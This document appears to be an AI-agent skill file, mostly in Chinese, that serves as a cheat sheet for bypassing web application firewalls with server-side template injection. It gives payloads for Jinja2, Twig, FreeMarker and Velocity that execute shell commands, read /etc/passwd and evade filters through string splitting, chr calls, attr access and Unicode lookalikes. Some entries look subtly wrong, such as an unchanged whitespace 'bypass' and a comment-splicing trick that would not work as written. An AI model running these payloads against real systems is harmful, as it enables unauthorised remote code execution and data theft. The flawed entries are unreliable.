---
name: ssti-waf-bypass
description: Use when encountering 服务端模板注入waf绕过技术 - jinja2/twig/freemarker
---

# SSTI WAF绕过攻击

## Info

- **Domain**: web
- **Tags**: web, ssti, template, waf-bypass

## 攻击思路
```
识别模板引擎 → 绕过过滤规则 → 构造Payload → RCE获取
```

## 模板引擎识别

| Payload | 响应 | 模板引擎 |
|---------|------|----------|
| ${7*7} | 49 | FreeMarker/Thymeleaf |
| {{7*7}} | 49 | Jinja2/Twig/Vue |
| <%= 7*7 %> | 49 | ERB/JSP |
| #{7*7} | 49 | Ruby/Java |

## Jinja2绕过矩阵

| 过滤类型 | 绕过方法 | Payload示例 |
|----------|----------|-------------|
| 关键词过滤 | attr属性访问 | request|attr('__class__') |
| 引号过滤 | chr函数 | chr(95)+chr(95)+'class'+chr(95)+chr(95) |
| 下划线过滤 | 编码/拼接 | request['__cla'+'ss__'] |
| 点号过滤 | 中括号访问 | request['__class__']['__bases__'] |
| 空格过滤 | 换行/tab | {{7*7}} → {{7*7}} |

### 基础RCE Payload
```python
# 标准Payload
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# attr绕过
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()}}

# request绕过
{{request['__class__']['__mro__'][2]['__subclasses__']()}}
```

### 字符串拼接绕过
```python
# 过滤下划线
{{''['__cla'+'ss__']['__mr'+'o__'][2]['__subcla'+'sses__']()}}

# 使用chr函数
{%set u=chr(95)%}{{''[u~u~'class'~u~u]}}
```

### 使用config对象
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

## Twig绕过

```php
# 基础Payload
{{_self.env.display.block_name}}
{{_self.env.getLoader().getTemplate('test').render()}}

# 读取文件
{{'/etc/passwd'|file_excerpt(1,30)}}

# RCE (需扩展)
{{['id']|filter('system')}}
```

## FreeMarker绕过

```java
# 基础检测
${7*7}

# RCE
${"freemarker.template.utility.Execute"?new()("id")}

# 类加载
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

## PE模板引擎绕过

```python
# Velocity
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
```

## 高级绕过技术

| 技术 | 说明 |
|------|------|
| Unicode绕过 | 使用Unicode相似字符 |
| 双重编码 | URL编码两次 |
| 注释混淆 | 插入注释/**/ |
| 空字节 | %00截断 |
| 大小写混淆 | CLaSS |

```python
# 注释混淆
{{''['__cla'/**/'ss__']}}

# Unicode混淆
{{''['__cl𝑎ss__']}}  # a使用Unicode数学字符
```

## 利用链构造

```
1. ''.__class__ → 获取str类
2. __mro__[2] → 获取object基类
3. __subclasses__() → 获取所有子类
4. 找到可利用类(如subprocess.Popen)
5. 实例化执行命令
```

```python
# 完整利用链
{{''.__class__.__mro__[2].__subclasses__()[索引].__init__.__globals__['popen']('id').read()}}
```